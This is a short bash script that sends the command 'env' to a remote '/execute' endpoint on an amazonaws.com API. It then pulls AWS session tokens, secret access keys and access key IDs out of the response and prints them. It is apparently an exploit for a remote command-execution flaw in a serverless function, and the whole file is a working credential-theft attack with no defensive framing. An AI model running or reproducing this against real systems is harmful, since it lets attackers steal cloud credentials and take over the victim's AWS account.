#!/bin/bash

# Send the command to the server
response=$(curl -s -X POST https://<API GOES HERE>.amazonaws.com/execute \
-H "Content-Type: application/json" \
-d '{"command":"env"}')

# Extract the stdout part of the response
stdout=$(echo $response | jq -r '.stdout')

# Parse each AWS credential from the stdout
AWS_SESSION_TOKEN=$(echo "$stdout" | grep 'AWS_SESSION_TOKEN=' | cut -d'=' -f2)
AWS_SECRET_ACCESS_KEY=$(echo "$stdout" | grep 'AWS_SECRET_ACCESS_KEY=' | cut -d'=' -f2)
AWS_ACCESS_KEY_ID=$(echo "$stdout" | grep 'AWS_ACCESS_KEY_ID=' | cut -d'=' -f2)

# If AWS_ACCESS_KEY_ID isn't found, try AWS_LAMY_ID based on your response structure
if [ -z "$AWS_ACCESS_KEY_ID" ]; then
    AWS_ACCESS_KEY_ID=$(echo "$stdout" | grep 'AWS_LAMY_ID=' | cut -d'=' -f2)
fi

echo "AWS_SESSION_TOKEN: $AWS_SESSION_TOKEN"
echo "AWS_SECRET_ACCESS_KEY: $AWS_SECRET_ACCESS_KEY"
echo "AWS_ACCESS_KEY_ID: $AWS_ACCESS_KEY_ID"
